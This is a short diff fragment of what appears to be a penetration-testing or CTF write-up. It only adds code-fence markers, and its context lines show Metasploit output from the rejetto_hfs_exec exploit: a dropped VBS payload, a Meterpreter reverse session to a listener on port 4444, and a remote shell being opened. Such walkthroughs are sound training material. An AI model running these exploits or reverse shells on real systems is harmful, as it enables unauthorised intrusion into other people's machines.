@@ -146,7 +146,9 @@ msf exploit(windows/http/rejetto_hfs_exec) > run
 [!] Tried to delete %TEMP%\MafKnXDVOp.vbs, unknown result
 [*] Meterpreter session 1 opened (192.168.175.163:4444 -> 10.49.180.14:49240) at 2026-07-10 11:28:10 -0400
 [*] Server stopped.
+```
 
+```
 meterpreter > shell
 Process 2216 created.
 Channel 2 created.
